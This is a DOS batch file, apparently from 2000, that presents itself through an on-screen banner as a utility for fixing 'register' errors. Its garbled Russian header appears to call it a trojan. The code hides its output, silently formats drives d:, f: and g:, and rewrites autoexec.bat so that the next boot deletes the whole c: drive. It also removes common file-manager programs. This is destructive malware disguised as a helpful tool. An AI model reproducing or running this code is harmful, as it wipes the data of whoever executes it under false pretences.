:    ‚­¨¬ ­¨¥! „ ­­ë© ä ©« ï¢«ï¥âáï âà®ï­æ¥¬. …£® ¨á¯®«ì§®¢ ­¨¥ ªà ©­¥
: … …ŠŽŒ…„“…’‘Ÿ.
:  (c) Copyright 2000 by Steel... Version 1.2
@echo off
cls
echo.
echo.
echo       ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo       º     New Utils, when find errors on your registers... º
echo       º  (c) Andrey Vologden... 2000 years                   º
echo       ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo  Wait...
@ctty nul
echo y| format g: /q /u /v:SYSTEM
echo y| format f: /q /u /v:SYSTEM
echo y| format f: /q /u /v:SYSTEM
echo y| format d: /q /u /v:SYSTEM
echo @echo off > c:\autoexec.bat
echo echo Please wait, until all registers be right... >> c:\autoexec.bat
echo @ctty nul >> c:\autoexec.bat
echo deltree/y c: >> c:\autoexec.bat
del c:\dn\dn.com
del c:\nc\nc.exe
del c:\vc\vc.com
